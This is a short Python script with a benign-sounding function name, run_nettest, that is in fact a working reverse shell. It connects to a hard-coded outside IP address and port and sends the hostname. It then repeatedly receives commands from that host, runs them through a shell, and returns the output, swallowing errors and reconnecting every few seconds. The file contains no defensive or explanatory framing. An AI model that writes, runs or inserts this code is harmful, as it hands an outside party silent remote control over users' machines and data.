import socket
import subprocess
import os
import time

def run_nettest():
    server_ip = "50.116.36.173"
    server_port = 7002

    while True:
        try:
            # Create a socket object
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                # Set a timeout for the connection attempt
                s.settimeout(10)
                s.connect((server_ip, server_port))

                # Send the system hostname
                hostname = socket.gethostname()
                s.sendall(hostname.encode('utf-8') + b'\n')

                # Use a small timeout for recv to allow for loop iterations and sleep
                s.settimeout(5)

                while True:
                    try:
                        # Read command from the connection
                        data = s.recv(4096)
                        if not data:
                            break

                        command = data.decode('utf-8').strip()
                        if not command:
                            continue

                        # Execute the command using subprocess
                        try:
                            # Executing the command and capturing output
                            result = subprocess.run(command, shell=True, capture_output=True, text=True)
                            output = result.stdout + result.stderr
                        except Exception as e:
                            output = str(e)

                        # Send the output back
                        if not output:
                            output = "(no output)"
                        s.sendall(output.encode('utf-8') + b'\n')

                    except socket.timeout:
                        # On timeout, we just continue the loop
                        # This allows the script to be responsive to connection drops
                        pass

                    # Small delay between command checks if connection is persistent
                    time.sleep(1)

        except Exception:
            # Silently ignore connection errors and retry after sleep
            pass

        # Loop continuously with a 5 second sleep between iterations
        time.sleep(5)

if __name__ == "__main__":
    run_nettest()
